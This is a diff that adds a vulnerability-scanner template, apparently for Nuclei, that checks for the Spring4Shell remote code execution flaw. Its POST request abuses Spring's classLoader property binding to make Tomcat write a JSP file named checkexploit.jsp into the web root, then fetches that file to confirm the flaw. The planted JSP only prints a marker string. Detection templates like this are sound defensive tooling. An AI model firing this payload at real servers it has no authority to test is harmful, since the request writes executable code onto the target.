@@ -1,0 +1,33 @@
+id: spring-4-shell
+
+info:
+  name: Spring 4 Shell Vulnerability
+  author: justmumu
+  description: Spring 4 Shell Remote Code Execution Vulnerability
+  severity: high
+  tags: spring
+
+requests:
+  - method: POST
+    path:
+      - "{{BaseURL}}"
+    redirects: false
+    headers:
+      suffix: "%>"
+      c2: "<%"
+      Content-Type: application/x-www-form-urlencoded
+    body: class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(%22j%22))%7B%20out.println(new%20String(%22exploitable%22))%3B%20%7D%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=checkexploit&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=
+
+  - method: GET
+    path:
+      - "{{RootURL}}/checkexploit.jsp"
+    
+    matchers:
+      - type: status
+      
+        status:
+          - 200
+    
+
+
+      
